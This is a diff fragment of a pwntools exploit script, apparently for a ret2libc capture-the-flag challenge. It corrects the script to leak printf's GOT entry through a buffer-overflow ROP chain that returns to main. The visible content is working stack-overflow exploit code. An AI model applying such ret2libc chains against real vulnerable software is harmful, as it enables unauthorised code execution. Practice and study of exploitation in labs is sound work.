@@ -3,7 +3,7 @@ p = process("./ret2libc3")
 elf = p.elf
 main = elf.sym['main']
 printf = 0x8048430 
-printf_got = elf.sym['printf']
+printf_got = elf.got['printf']
 
 p.sendline(b"a"*0x70 + b''.join(p32(i) for i in [
     printf, main, printf_got]))
